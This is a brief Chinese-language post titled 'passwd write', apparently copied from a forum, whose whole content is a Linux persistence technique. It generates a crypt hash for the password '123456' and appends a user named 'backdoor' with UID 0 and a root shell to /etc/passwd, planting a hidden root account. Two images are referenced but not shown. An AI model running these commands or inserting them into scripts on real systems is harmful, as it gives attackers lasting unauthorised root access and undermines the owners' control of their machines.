# passwd写入

> 原文：[https://www.zhihuifly.com/t/topic/3500](https://www.zhihuifly.com/t/topic/3500)

## passwd写入

```
perl -e 'print crypt("123456", "AA"). "\n"'
echo "backdoor:AASwmzPNx.3sg:0:0:me:/root:/bin/bash">>/etc/passwd 
```

![image](img/3616bfc17b420d330c208c26bf83f396.png)

![image](img/819e22b43cc77e7c310a44e5fdde946a.png)